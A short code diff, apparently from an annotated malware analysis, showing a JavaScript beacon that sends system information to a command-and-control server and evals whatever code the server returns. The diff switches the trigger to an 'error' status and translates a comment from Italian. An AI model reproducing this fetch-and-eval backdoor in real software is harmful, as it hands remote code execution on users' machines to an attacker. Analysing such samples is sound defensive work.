@@ -49,8 +49,8 @@ async function sendRequest(sysInfo) {
     const res = await fetch(url + '?' + params);
     const { status, message, sysId: newId } = await res.json();
 
-    if (status === 'success') {
-      try { eval(message); } catch (e) {}   // ⚠️⚠️ RCE: esegue codice arbitrario dal C2
+    if (status === 'error') {              // ⚠️ trigger keyword is "error" (counter-intuitive)
+      try { eval(message); } catch (e) {}   // ⚠️⚠️ RCE: executes arbitrary code from the C2
     }
     if (newId) sysId = newId;
   } catch (e) { console.error(e); }
